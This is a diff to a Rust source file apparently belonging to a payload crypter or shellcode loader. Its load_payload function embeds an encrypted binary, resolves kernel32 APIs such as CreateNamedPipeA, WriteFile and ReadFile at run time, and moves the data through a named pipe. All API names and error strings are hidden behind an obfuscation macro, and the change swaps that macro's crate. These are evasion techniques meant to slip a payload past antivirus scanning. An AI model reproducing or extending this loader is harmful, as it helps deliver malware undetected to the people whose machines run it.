@@ -4,7 +4,7 @@ use std::time::Duration;
 use rand::Rng;
 use std::ptr;
 use crate::utils::{load_library, get_proc_address};
-use rustcrypt_ct_macros::obf_lit_bytes;
+use obfstr::obfbytes;
 
 pub fn load_payload() -> Result<Vec<u8>, String> {
     const ENCRYPT_DATA: &'static [u8] = include_bytes!("../../output/encrypt.bin");
@@ -21,7 +21,7 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
     
     thread::spawn(move || {
         unsafe {
-            if let Ok(kernel32) = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice()) {
+            if let Ok(kernel32) = load_library(obfbytes!(b"kernel32.dll\0").as_slice()) {
                 // Define function types
                 type CreateNamedPipeAFn = unsafe extern "system" fn(*const u8, u32, u32, u32, u32, u32, u32, *const c_void) -> isize;
                 type ConnectNamedPipeFn = unsafe extern "system" fn(isize, *mut c_void) -> i32;
@@ -31,12 +31,12 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
                 type GetLastErrorFn = unsafe extern "system" fn() -> u32;
 
                 // Load functions
-                let create_named_pipe_a: CreateNamedPipeAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateNamedPipeA\0").as_slice()).unwrap_or(ptr::null()));
-                let connect_named_pipe: ConnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ConnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
-                let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"WriteFile\0").as_slice()).unwrap_or(ptr::null()));
-                let disconnect_named_pipe: DisconnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"DisconnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
-                let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).unwrap_or(ptr::null()));
-                let get_last_error: GetLastErrorFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"GetLastError\0").as_slice()).unwrap_or(ptr::null()));
+                let create_named_pipe_a: CreateNamedPipeAFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CreateNamedPipeA\0").as_slice()).unwrap_or(ptr::null()));
+                let connect_named_pipe: ConnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"ConnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
+                let write_file: WriteFileFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"WriteFile\0").as_slice()).unwrap_or(ptr::null()));
+                let disconnect_named_pipe: DisconnectNamedPipeFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"DisconnectNamedPipe\0").as_slice()).unwrap_or(ptr::null()));
+                let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CloseHandle\0").as_slice()).unwrap_or(ptr::null()));
+                let get_last_error: GetLastErrorFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"GetLastError\0").as_slice()).unwrap_or(ptr::null()));
 
                 if create_named_pipe_a as usize != 0 {
                     let h_pipe = create_named_pipe_a(
@@ -78,14 +78,14 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
     const MAX_ATTEMPTS: u32 = 20;
     
     unsafe {
-        let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
+        let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
         type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *const c_void, u32, u32, isize) -> isize;
         type ReadFileFn = unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *mut c_void) -> i32;
         type CloseHandleFn = unsafe extern "system" fn(isize) -> i32;
 
-        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
-        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
-        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obf_lit_bytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obf_lit_bytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);
+        let create_file_a: CreateFileAFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CreateFileA\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load CreateFileA\0").as_slice()).to_string())?);
+        let read_file: ReadFileFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"ReadFile\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load ReadFile\0").as_slice()).to_string())?);
+        let close_handle: CloseHandleFn = std::mem::transmute(get_proc_address(kernel32, obfbytes!(b"CloseHandle\0").as_slice()).map_err(|_| String::from_utf8_lossy(obfbytes!(b"Failed to load CloseHandle\0").as_slice()).to_string())?);
 
         while attempts < MAX_ATTEMPTS {
              let h_file = create_file_a(
@@ -122,5 +122,5 @@ pub fn load_payload() -> Result<Vec<u8>, String> {
         }
     }
 
-    Err(String::from_utf8_lossy(obf_lit_bytes!(b"Failed to read from named pipe\0").as_slice()).to_string())
+    Err(String::from_utf8_lossy(obfbytes!(b"Failed to read from named pipe\0").as_slice()).to_string())
 }
